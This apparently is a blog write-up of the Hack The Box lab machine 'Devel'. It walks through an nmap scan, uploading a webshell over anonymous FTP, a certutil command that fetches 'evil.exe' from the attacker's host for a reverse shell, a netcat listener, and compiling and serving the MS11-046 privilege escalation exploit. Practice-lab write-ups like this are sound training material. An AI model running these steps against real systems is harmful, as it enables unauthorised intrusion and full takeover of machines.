@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Writeup - HTB Devel | kei5uke&#39;s Hacking Note</title>
+<meta property="og:title" content="Writeup - HTB Devel | kei5uke&#39;s Hacking Note" />
+<meta name="twitter:title" content="Writeup - HTB Devel | kei5uke&#39;s Hacking Note" />
+<meta itemprop="name" content="Writeup - HTB Devel | kei5uke&#39;s Hacking Note" />
+<meta name="application-name" content="Writeup - HTB Devel | kei5uke&#39;s Hacking Note" />
+<meta property="og:site_name" content="kei5uke&#39;s Hacking Note" />
+
+<meta name="description" content="Writeup for HTB Devel">
+<meta itemprop="description" content="Writeup for HTB Devel" />
+<meta property="og:description" content="Writeup for HTB Devel" />
+<meta name="twitter:description" content="Writeup for HTB Devel" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+  <meta itemprop="image" content="" />
+  <meta property="og:image" content="" />
+  <meta name="twitter:image" content="" />
+  <meta name="twitter:image:src" content="" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-11-13T00:00:00Z />
+    <meta property="article:published_time" content=2023-11-13T00:00:00Z />
+
+    
+    <meta property="og:article:author" content="Kei5uke" />
+    <meta property="article:author" content="Kei5uke" />
+    <meta name="author" content="Kei5uke" />
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Writeup - HTB Devel",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-11-13",
+        "description": "Writeup for HTB Devel",
+        "wordCount":  450 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-11-13",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "kei5uke\u0027s Hacking Note"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.118.2">
+
+    
+
+    <link rel="canonical" href="/posts/devel/">
+    <link href="/style.min.9bd04d0fad85388343088ec85e9afd787ea003e72914d7f57df39c17ab2e7173.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "auto" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/pages/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Writeup - HTB Devel</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-11-13T00:00:00&#43;00:00" itemprop="datePublished"> 13 Nov 2023 </time>
+                </div>
+                
+            </header>
+                <details class="toc">
+                    <summary><b>Table of Contents</b></summary>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#devel">Devel</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#ftp">FTP</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#root-shell">Root shell</a></li>
+    <li><a href="#note">Note</a></li>
+  </ul>
+</nav>
+                </details>
+                <div class="page-content">
+                <h1 id="devel">Devel</h1>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="nmap">Nmap</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/devel<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -sV -sC -T4 -p- 10.129.105.132 -oN nmap.txt
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-11-13 18:41 EET
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.105.132
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.054s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">21/tcp open  ftp     Microsoft ftpd
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-syst: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  SYST: Windows_NT
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 03-17-17  04:37PM                  <span class="m">689</span> iisstart.htm
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_03-17-17  04:37PM               <span class="m">184946</span> welcome.png
+</span></span><span class="line"><span class="cl">80/tcp open  http    Microsoft IIS httpd 7.5
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/7.5
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: IIS7
+</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 113.43 seconds
+</span></span></code></pre></div><h2 id="ftp">FTP</h2>
+<p>FTP is readable and writeable</p>
+<p><img src="Devel%20f19bb8bb1789445f9b40f3338077e67b/Screenshot_2023-11-13_at_18.48.24.png" alt="Screenshot 2023-11-13 at 18.48.24.png"></p>
+<p>I uploaded command aspx file from /usr/share/webshells/</p>
+<p>Looks like its working. But I need a proper shell.</p>
+<p><img src="Devel%20f19bb8bb1789445f9b40f3338077e67b/Screenshot_2023-11-13_at_19.09.35.png" alt="Screenshot 2023-11-13 at 19.09.35.png"></p>
+<p>I used the command below:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certutil.exe -urlcache -split -f <span class="s2">&#34;http://192.168.49.68/evil.exe&#34;</span> <span class="s2">&#34;C:\Backup\evil.exe&#34;</span>
+</span></span></code></pre></div><p><img src="Devel%20f19bb8bb1789445f9b40f3338077e67b/Screenshot_2023-11-13_at_19.24.09.png" alt="Screenshot 2023-11-13 at 19.24.09.png"></p>
+<p><img src="Devel%20f19bb8bb1789445f9b40f3338077e67b/Screenshot_2023-11-13_at_19.24.53.png" alt="Screenshot 2023-11-13 at 19.24.53.png"></p>
+<p>I got first shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>/opt/generic<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# rlwrap nc -lvnp <span class="m">21</span>                                                         
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">21</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.16.23<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.105.132<span class="o">]</span> <span class="m">49186</span>
+</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 6.1.7600<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2009</span> Microsoft Corporation.  All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;whoami
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">iis apppool<span class="se">\w</span>eb
+</span></span></code></pre></div><h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>sysinfo</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;systeminfo
+</span></span><span class="line"><span class="cl">systeminfo
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host Name:                 DEVEL
+</span></span><span class="line"><span class="cl">OS Name:                   Microsoft Windows <span class="m">7</span> Enterprise 
+</span></span><span class="line"><span class="cl">OS Version:                6.1.7600 N/A Build <span class="m">7600</span>
+</span></span><span class="line"><span class="cl">OS Manufacturer:           Microsoft Corporation
+</span></span><span class="line"><span class="cl">OS Configuration:          Standalone Workstation
+</span></span><span class="line"><span class="cl">OS Build Type:             Multiprocessor Free
+</span></span><span class="line"><span class="cl">Registered Owner:          babis
+</span></span><span class="line"><span class="cl">Registered Organization:   
+</span></span><span class="line"><span class="cl">Product ID:                55041-051-0948536-86302
+</span></span><span class="line"><span class="cl">Original Install Date:     17/3/2017, 4:17:31 ��
+</span></span><span class="line"><span class="cl">System Boot Time:          13/11/2023, 6:40:33 ��
+</span></span><span class="line"><span class="cl">System Manufacturer:       VMware, Inc.
+</span></span><span class="line"><span class="cl">System Model:              VMware Virtual Platform
+</span></span><span class="line"><span class="cl">System Type:               X86-based PC
+</span></span><span class="line"><span class="cl">Processor<span class="o">(</span>s<span class="o">)</span>:              <span class="m">1</span> Processor<span class="o">(</span>s<span class="o">)</span> Installed.
+</span></span><span class="line"><span class="cl">                           <span class="o">[</span>01<span class="o">]</span>: x64 Family <span class="m">6</span> Model <span class="m">85</span> Stepping <span class="m">7</span> GenuineIntel ~2294 Mhz
+</span></span><span class="line"><span class="cl">BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
+</span></span><span class="line"><span class="cl">Windows Directory:         C:<span class="se">\W</span>indows
+</span></span><span class="line"><span class="cl">System Directory:          C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32
+</span></span><span class="line"><span class="cl">Boot Device:               <span class="se">\D</span>evice<span class="se">\H</span>arddiskVolume1
+</span></span><span class="line"><span class="cl">System Locale:             el<span class="p">;</span>Greek
+</span></span><span class="line"><span class="cl">Input Locale:              en-us<span class="p">;</span>English <span class="o">(</span>United States<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Time Zone:                 <span class="o">(</span>UTC+02:00<span class="o">)</span> Athens, Bucharest, Istanbul
+</span></span><span class="line"><span class="cl">Total Physical Memory:     3.071 MB
+</span></span><span class="line"><span class="cl">Available Physical Memory: 2.063 MB
+</span></span><span class="line"><span class="cl">Virtual Memory: Max Size:  6.141 MB
+</span></span><span class="line"><span class="cl">Virtual Memory: Available: 5.142 MB
+</span></span><span class="line"><span class="cl">Virtual Memory: In Use:    <span class="m">999</span> MB
+</span></span><span class="line"><span class="cl">Page File Location<span class="o">(</span>s<span class="o">)</span>:     C:<span class="se">\p</span>agefile.sys
+</span></span><span class="line"><span class="cl">Domain:                    HTB
+</span></span><span class="line"><span class="cl">Logon Server:              N/A
+</span></span><span class="line"><span class="cl">Hotfix<span class="o">(</span>s<span class="o">)</span>:                 N/A
+</span></span><span class="line"><span class="cl">Network Card<span class="o">(</span>s<span class="o">)</span>:           <span class="m">1</span> NIC<span class="o">(</span>s<span class="o">)</span> Installed.
+</span></span><span class="line"><span class="cl">                           <span class="o">[</span>01<span class="o">]</span>: vmxnet3 Ethernet Adapter
+</span></span><span class="line"><span class="cl">                                 Connection Name: Local Area Connection <span class="m">4</span>
+</span></span><span class="line"><span class="cl">                                 DHCP Enabled:    Yes
+</span></span><span class="line"><span class="cl">                                 DHCP Server:     10.129.0.1
+</span></span><span class="line"><span class="cl">                                 IP address<span class="o">(</span>es<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                                 <span class="o">[</span>01<span class="o">]</span>: 10.129.105.132
+</span></span><span class="line"><span class="cl">                                 <span class="o">[</span>02<span class="o">]</span>: fe80::303f:619:f6ed:cb15
+</span></span><span class="line"><span class="cl">                                 <span class="o">[</span>03<span class="o">]</span>: dead:beef::b027:6d8a:fa22:9574
+</span></span><span class="line"><span class="cl">                                 <span class="o">[</span>04<span class="o">]</span>: dead:beef::303f:619:f6ed:cb15
+</span></span></code></pre></div><p>I found the usable script.</p>
+<p><a href="https://www.exploit-db.com/exploits/40564">Microsoft Windows (x86) - &lsquo;afd.sys&rsquo; Local Privilege Escalation (MS11-046)</a></p>
+<p>Compiled the script and downloaded.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>/opt/generic<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
+</span></span><span class="line"><span class="cl">                                                                                                                              
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>/opt/generic<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# python3 -m http.server <span class="m">80</span>                               
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</span></span><span class="line"><span class="cl">10.129.105.132 - - <span class="o">[</span>13/Nov/2023 19:41:01<span class="o">]</span> <span class="s2">&#34;GET /MS11-046.exe HTTP/1.1&#34;</span> <span class="m">200</span> -
+</span></span></code></pre></div><h1 id="root-shell">Root shell</h1>
+<p><img src="Devel%20f19bb8bb1789445f9b40f3338077e67b/Screenshot_2023-11-13_at_19.43.39.png" alt="Screenshot 2023-11-13 at 19.43.39.png"></p>
+<h1 id="note">Note</h1>
+<p>You can try asp or aspx for getting reverse shell.</p>
+<p>Old windows tends to be easily exploitable with just one script.</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/kei5uke" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2023 kei5uke.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank"  rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
